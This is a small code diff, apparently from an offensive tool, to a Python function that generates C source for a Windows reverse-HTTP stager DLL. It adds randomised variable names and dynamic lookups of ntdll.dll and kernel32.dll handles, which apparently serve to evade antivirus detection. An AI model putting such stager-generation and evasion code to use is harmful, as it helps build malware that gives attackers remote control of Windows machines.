@@ -91,6 +91,15 @@ def RevHttpStager_C_windows(ModOpt):
         Ret_code += "BOOL bReturnValue = TRUE;\n"
         Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"
 
+    if ModOpt["DynImport"] == True:
+
+        ModOpt["NtdllHandle"] = varname_creator()
+        ModOpt["Ker32Handle"] = varname_creator()
+
+        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
+        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
+
+
     Ret_code += "$:START\n"
 
     Ret_code += WindowsDefend(ModOpt)
